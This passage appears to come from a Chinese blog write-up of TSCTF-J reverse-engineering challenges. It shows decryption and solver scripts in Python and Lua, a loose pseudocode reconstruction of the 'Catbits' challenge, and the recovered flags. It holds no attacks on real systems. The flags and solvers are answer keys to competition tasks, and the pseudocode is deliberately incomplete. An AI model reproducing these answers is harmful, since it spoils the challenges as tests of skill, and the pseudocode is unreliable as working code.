class="line"></span><br><span class="line">    lua_plain = chacha20_decrypt(secret, KEY, NONCE, INITIAL_COUNTER)</span><br><span class="line">    Path(<span class="string">&quot;decrypted_lua.lua&quot;</span>).write_bytes(lua_plain)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;完成：decrypted_lua.lua (<span class="subst">&#123;<span class="built_in">len</span>(lua_plain)&#125;</span> 字节)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">xor_byte</span><span class="params">(a, b)</span></span></span><br><span class="line">    <span class="keyword">local</span> result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">0</span>, <span class="number">7</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> x = a % <span class="number">2</span></span><br><span class="line">        <span class="keyword">local</span> y = b % <span class="number">2</span></span><br><span class="line">        result = result + ((x ~ y) &lt;&lt; i)</span><br><span class="line">        a = <span class="built_in">math</span>.<span class="built_in">floor</span>(a / <span class="number">2</span>)</span><br><span class="line">        b = <span class="built_in">math</span>.<span class="built_in">floor</span>(b / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span><span class="params">(str, key)</span></span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, #str <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> c = <span class="built_in">string</span>.<span class="built_in">byte</span>(str, i)</span><br><span class="line">        c = (c + <span class="number">1</span>) % <span class="number">255</span></span><br><span class="line">        <span class="keyword">local</span> k = <span class="built_in">string</span>.<span class="built_in">byte</span>(key, (i - <span class="number">1</span>) % #key + <span class="number">1</span>)</span><br><span class="line">        result[i] = <span class="built_in">string</span>.<span class="built_in">char</span>(xor_byte(c, k))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">table</span>.<span class="built_in">concat</span>(result)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- base64 encode</span></span><br><span class="line"><span class="keyword">local</span> b=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64_encode</span><span class="params">(data)</span></span></span><br><span class="line">    <span class="keyword">return</span> ((data:<span class="built_in">gsub</span>(<span class="string">&#x27;.&#x27;</span>, <span class="function"><span class="keyword">function</span><span class="params">(x)</span></span></span><br><span class="line">        <span class="keyword">local</span> r,bits=<span class="string">&#x27;&#x27;</span>,<span class="built_in">string</span>.<span class="built_in">byte</span>(x)</span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">8</span>,<span class="number">1</span>,<span class="number">-1</span> <span class="keyword">do</span> r=r..(bits % <span class="number">2</span>^i - bits % <span class="number">2</span>^(i<span class="number">-1</span>) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;0&#x27;</span>) <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">end</span>)..<span class="string">&#x27;0000&#x27;</span>):<span class="built_in">gsub</span>(<span class="string">&#x27;%d%d%d?%d?%d?%d?&#x27;</span>, <span class="function"><span class="keyword">function</span><span class="params">(x)</span></span></span><br><span class="line">        <span class="keyword">if</span> #x &lt; <span class="number">6</span> <span class="keyword">then</span> <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> c=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">1</span>,<span class="number">6</span> <span class="keyword">do</span> c=c+(x:<span class="built_in">sub</span>(i,i)==<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">2</span>^(<span class="number">6</span>-i) <span class="keyword">or</span> <span class="number">0</span>) <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> b:<span class="built_in">sub</span>(c+<span class="number">1</span>,c+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">end</span>)..(&#123; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, <span class="string">&#x27;=&#x27;</span> &#125;)[#data % <span class="number">3</span> + <span class="number">1</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">(plain, key)</span></span></span><br><span class="line">    <span class="keyword">return</span> base64_encode(xor_encrypt(plain, key))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_enter</span><span class="params">(args)</span></span></span><br><span class="line">    <span class="keyword">local</span> strobj = args[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">local</span> str = getJavaStringContent(strobj)</span><br><span class="line">    <span class="keyword">local</span> encrypted = encrypt(str, <span class="string">&quot;W0WY0U4R3S0G00D2F1NDTH3K3Y&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> e1 = createJavaString(strobj, encrypted)</span><br><span class="line">    args[<span class="number">1</span>] = e1</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>, args, <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">FAKE_B64 = <span class="string">&quot;AmQTDHd7fy5CIAQyRUokVD1RJ3VlJFM4WTE+CBcn&quot;</span></span><br><span class="line">KEY = <span class="string">b&quot;W0WY0U4R3S0G00D2F1NDTH3K3Y&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_byte</span>(<span class="params">a, b</span>):</span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r |= ((a &amp; <span class="number">1</span>) ^ (b &amp; <span class="number">1</span>)) &lt;&lt; i</span><br><span class="line">        a &gt;&gt;= <span class="number">1</span></span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">fake_b64, key_bytes</span>):</span><br><span class="line">    cipher = base64.b64decode(fake_b64)</span><br><span class="line">    plain = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher):</span><br><span class="line">        k = key_bytes[i % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        t = xor_byte(c, k)</span><br><span class="line">        p = (t - <span class="number">1</span>) % <span class="number">255</span>  <span class="comment"># 逆向 “加 1 再取模 255” 的操作</span></span><br><span class="line">        plain.append(p)</span><br><span class="line">    <span class="keyword">return</span> plain.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    real_flag = decrypt(FAKE_B64, KEY)</span><br><span class="line">    <span class="built_in">print</span>(real_flag)</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{pr3tty_ez_h00k_righ7?}</p>
<h3 id="Catbits"><a href="#Catbits" class="headerlink" title="Catbits"></a>Catbits</h3><p>第二天上了一上午一下午的课，看了下思路偏了</p>
<p>解压出来有个json</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173158574.png" alt="image-20251013173158574"></p>
<p>纯手搓了一下午，分析对象之间的调用关系，还真给我分析出来了</p>
<p>有个nibble swap：((x &amp; 0xF) &lt;&lt; 4) | ((x &gt;&gt; 4) &amp; 0xF)</p>
<p>arc_bravo[i] &#x3D; after_charlie[i] XOR arc_bravo[i-1]</p>
<p>和idx[i] &#x3D; arc_bravo[i] - (i+1)</p>
<p>可能有个索引表qrazybox</p>
<p>最后写了个解密算法</p>
<p>出了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;F`&#x27;*catcatPL~3` catcatcatcatJ catcat!*H&#125;</span><br></pre></td></tr></table></figure>

<p>包错的，第二天晚上突然看了下，发现</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173525557.png" alt="image-20251013173525557"></p>
<p>每个角色都能点……</p>
<p>根本不用分析json T.T</p>
<p>这题其实就注意广播就行，还有细心点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013174639309.png" alt="image-20251013174639309"></p>
<p>第三天做，感觉半小时能搞定结果，搞了四五个小时…</p>
<p>因为死活找不到Toko</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173648870.png" alt="image-20251013173648870"></p>
<p>在这找到了最后</p>
<p>整理下逻辑</p>
<p>写了个超级伪代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">orc = []</span><br><span class="line">src = [<span class="number">211</span>,<span class="number">71</span>,<span class="number">210</span>,<span class="number">132</span>,<span class="number">193</span>,<span class="number">114</span>,<span class="number">244</span>,<span class="number">208</span>,<span class="number">213</span>,<span class="number">99</span>,<span class="number">37</span>,<span class="number">214</span>,<span class="number">224</span>,<span class="number">101</span>,<span class="number">98</span>,<span class="number">212</span>,<span class="number">224</span>,<span class="number">118</span>] <span class="comment">#从1开始</span></span><br><span class="line">arc = [] <span class="comment"># 长度为实际存储的 + 1，从1 开始</span></span><br><span class="line"><span class="comment"># 输入的往列表orc里存，从1开始</span></span><br><span class="line"><span class="comment"># 初始化arc</span></span><br><span class="line"><span class="comment"># 循环 arc</span></span><br><span class="line">qrazybox = [<span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">ind3x = <span class="number">1</span></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line">arc[<span class="number">0</span>] = <span class="number">114</span></span><br><span class="line">orc = <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> ind3x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(orc) + <span class="number">1</span>):</span><br><span class="line">    t1 = <span class="number">0</span></span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> t1 = <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> qrazybox[index] = orc[ind3x]:</span><br><span class="line">            t1 = <span class="number">1</span></span><br><span class="line">            ret = index</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> index &gt; <span class="built_in">len</span>(qrazybox):</span><br><span class="line">            ret = ???</span><br><span class="line">            t1 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ret !=???:</span><br><span class="line">        arc.append[ret]</span><br><span class="line">        orc[ind3x] = qrazybox[ret]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ar = ?</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nonono&quot;</span>)</span><br><span class="line"></span><br><span class="line">ar = ind3x</span><br><span class="line">inde3x = <span class="number">1</span></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc)+ <span class="number">1</span>):</span><br><span class="line">    b1 = arc[i]</span><br><span class="line">    k = b1 + i</span><br><span class="line">    <span class="keyword">if</span> k &gt; <span class="number">255</span>:</span><br><span class="line">        bm = k - <span class="number">255</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bm = k</span><br><span class="line">    arc[i] = bm</span><br><span class="line"></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc)+ <span class="number">1</span>):</span><br><span class="line">    cr = <span class="number">0</span></span><br><span class="line">    c1 = 四舍五入(arc[i])</span><br><span class="line">    c2 = 四舍五入(arc[i - <span class="number">1</span>])</span><br><span class="line">    c5 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> c1 == <span class="number">0</span> &amp;&amp; c2 ==<span class="number">0</span>:</span><br><span class="line">        c3 = c1除以<span class="number">2</span>的余数</span><br><span class="line">        c4 = c2除以<span class="number">2</span>的余数</span><br><span class="line">        c6 = (c3 + c4) 除以<span class="number">2</span>的余数</span><br><span class="line">        cr = cr + c5 * c6</span><br><span class="line">        c1 = 向下取整(c1/<span class="number">2</span>)</span><br><span class="line">        c2 = 向下取整(c2/<span class="number">2</span>)</span><br><span class="line">        c5 = c5 * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    arc[i] = cr</span><br><span class="line"></span><br><span class="line">index1 = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc)+ <span class="number">1</span>):</span><br><span class="line">    deltaa = 四舍五入(arc[i])</span><br><span class="line">    deltab = (deltaa除以<span class="number">16</span>的余数)</span><br><span class="line">    deltac = deltab * <span class="number">16</span></span><br><span class="line">    delta_ret = deltac</span><br><span class="line">    ea = 四舍五入(arc[i])</span><br><span class="line">    ei = (ea除以<span class="number">16</span>的余数)</span><br><span class="line">    eu = ea - ei</span><br><span class="line">    ee = 向下取整(eu/<span class="number">16</span>)</span><br><span class="line">    e_ret = ee</span><br><span class="line">    f1 = delta_ret</span><br><span class="line">    f2 = e_ret</span><br><span class="line">    cha_ret = <span class="number">0</span></span><br><span class="line">    cha1 = 四舍五入(f1)</span><br><span class="line">    cha2 = 四舍五入(f2)</span><br><span class="line">    cha5 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> cha1 == <span class="number">0</span> &amp;&amp; cha2 ==<span class="number">0</span>:</span><br><span class="line">        cha3 = cha1除以<span class="number">2</span>的余数</span><br><span class="line">        cha4 = cha2除以<span class="number">2</span>的余数</span><br><span class="line">        <span class="keyword">if</span> cha3 ==<span class="number">1</span> 或 cha4 == <span class="number">1</span>:</span><br><span class="line">            cha6 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cha6 = <span class="number">0</span></span><br><span class="line">        char = char + cha5 * cha6</span><br><span class="line">        cha1 = 向下取整(cha1/<span class="number">2</span>)</span><br><span class="line">        cha2 = 向下取整(cha2/<span class="number">2</span>)</span><br><span class="line">        cha5 = cha5 * <span class="number">2</span></span><br><span class="line">    arc[i] = char</span><br><span class="line"></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(src) != <span class="built_in">len</span>(arc) -<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Nonono&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> arc[i] != src[i - <span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Nonono&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你过关&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>跟之前的json对照了下得到主逻辑，挺简单的差不多</p>
<p>结果又卡住了</p>
<p>没有注意到初始值是2</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173921845.png" alt="image-20251013173921845"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">src = [<span class="number">211</span>, <span class="number">71</span>, <span class="number">210</span>, <span class="number">132</span>, <span class="number">193</span>, <span class="number">114</span>, <span class="number">244</span>, <span class="number">208</span>, <span class="number">213</span>, <span class="number">99</span>, <span class="number">37</span>, <span class="number">214</span>, <span class="number">224</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">212</span>, <span class="number">224</span>, <span class="number">118</span>]</span><br><span class="line"></span><br><span class="line">qrazy = [<span class="string">&#x27;catcat&#x27;</span>] * <span class="number">32</span> + [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">                           <span 